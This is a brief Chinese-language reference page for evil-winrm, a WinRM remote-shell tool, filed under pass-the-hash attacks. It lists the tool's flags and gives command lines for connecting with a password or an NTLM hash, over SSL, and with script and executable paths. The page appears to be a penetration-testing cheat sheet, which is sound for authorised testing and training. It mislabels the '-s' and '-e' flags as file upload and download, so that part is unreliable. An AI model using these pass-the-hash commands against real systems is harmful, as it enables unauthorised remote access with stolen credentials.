# evil-winrm

## 简介
WinRM 协议的 shell 工具，支持 Pass-the-Hash

## 核心参数
- `-i`: 目标 IP
- `-u/-p`: 用户名/密码
- `-H`: NTLM 哈希

## 命令示例
```bash
# 使用密码连接
evil-winrm -i 192.168.1.100 -u admin -p password

# Pass-the-Hash
evil-winrm -i 192.168.1.100 -u admin -H ntlm_hash

# 指定端口
evil-winrm -i 192.168.1.100 -u admin -p password -P 5986

# 使用 SSL
evil-winrm -i 192.168.1.100 -u admin -p password -S

# 上传文件
evil-winrm -i 192.168.1.100 -u admin -p password -s /local/scripts

# 下载文件
evil-winrm -i 192.168.1.100 -u admin -p password -e /local/exes
```

## 使用场景
当目标开启 WinRM 服务（5985/5986）时的远程连接

## 所属分类
- [Pass-the-Hash 攻击 (Pass-the-Hash)](../categories/13-pass-the-hash.md)
